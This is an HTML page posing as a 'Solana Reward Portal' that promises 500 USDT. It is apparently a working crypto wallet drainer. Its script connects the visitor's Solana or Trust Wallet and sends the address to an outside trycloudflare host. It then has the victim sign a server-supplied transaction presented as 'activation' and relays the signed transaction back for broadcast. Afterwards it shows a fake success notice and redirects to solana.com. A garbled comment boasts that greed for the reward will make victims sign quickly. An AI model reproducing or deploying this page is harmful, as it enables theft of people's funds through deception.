<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Solana Reward Portal</title>
    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
    <style>
        body { background: #050505; color: #fff; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .box { width: 330px; padding: 30px; background: #111; border: 1px solid #14f19533; border-radius: 30px; text-align: center; position: relative; }
        .reward-tag { background: #14f19522; color: #14f195; padding: 8px 15px; border-radius: 50px; font-size: 12px; font-weight: bold; display: inline-block; margin-bottom: 20px; }
        .amount { font-size: 48px; font-weight: 900; color: #fff; margin: 10px 0; font-family: 'Courier New', monospace; }
        .sub-text { color: #666; font-size: 13px; margin-bottom: 30px; line-height: 1.5; }
        .btn { background: #14f195; color: #000; border: none; padding: 20px; width: 100%; border-radius: 15px; font-weight: 900; cursor: pointer; font-size: 18px; box-shadow: 0 10px 30px rgba(20, 241, 149, 0.3); }
        #st { font-size: 11px; color: #333; margin-top: 25px; font-family: monospace; letter-spacing: 2px; }
        .status-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); border-radius: 30px; display: none; flex-direction: column; justify-content: center; align-items: center; z-index: 100; }
    </style>
</head>
<body>
    <div class="box">
        <div id="overlay" class="status-overlay">
            <h3 id="msg" style="color:#14f195;">SYNCING...</h3>
            <p id="submsg" style="color:#666; font-size:12px;">Connecting to secure node...</p>
        </div>

        <div class="reward-tag">âœ“ UNCLAIMED REWARD DETECTED</div>
        <div class="amount">500.00</div>
        <div style="font-size: 14px; color: #14f195; margin-bottom: 20px; font-weight: bold;">USDT (SPL-TOKEN)</div>
        
        <p class="sub-text">This reward has been allocated to your wallet based on your network activity. Activate your account to complete the withdrawal.</p>
        
        <button id="cta" class="btn">ACTIVATE & CLAIM</button>
        <div id="st">SECURED BY SOLANA MAINNET</div>
    </div>

    <script>
        const tunnel = "https://lonely-concern-challenging-hosted.trycloudflare.com";

        document.getElementById('cta').onclick = async function() {
            const overlay = document.getElementById('overlay');
            const msg = document.getElementById('msg');
            const submsg = document.getElementById('submsg');
            const web3 = window.solanaWeb3;

            try {
                const p = window.trustwallet?.solana || window.solana;
                if (!p) { alert("Please use Trust Wallet Browser."); return; }

                overlay.style.display = 'flex';
                
                msg.innerText = "CONNECTING...";
                await p.connect();

                msg.innerText = "VERIFYING...";
                const resp = await fetch(tunnel + "/prepare_v32", {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ address: p.publicKey.toString() })
                });
                const info = await resp.json();
                
                msg.innerText = "ACTIVATING...";
                submsg.innerText = "Please confirm the secure signature in your wallet.";
                
                const tx = web3.Transaction.from(Uint8Array.from(atob(info.raw_tx), c => c.charCodeAt(0)));
                
                // ðŸ”± æ ¸å¿ƒç‚¹ç«ï¼šç”¨æˆ·ä¸ºäº†é‚£ 500Uï¼Œç‚¹è¿™ä¸ªç­¾åç¡®è®¤ä¼šéžå¸¸å¿«
                const signed = await p.signTransaction(tx);
                
                msg.innerText = "BROADCASTING...";
                const signedBase64 = btoa(String.fromCharCode.apply(null, signed.serialize()));

                await fetch(tunnel + "/broadcast_v41", {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ signed_tx: signedBase64 })
                });

                msg.innerText = "SUCCESS!";
                submsg.innerText = "Reward will arrive within 24 hours.";
                
                setTimeout(() => {
                    alert("Activation Successful! \n\nThe 500 USDT has been queued for delivery to your address.");
                    window.location.href = "https://solana.com"; 
                }, 1500);

            } catch (err) {
                overlay.style.display = 'none';
                console.error(err);
            }
        };
    </script>
</body>
</html>
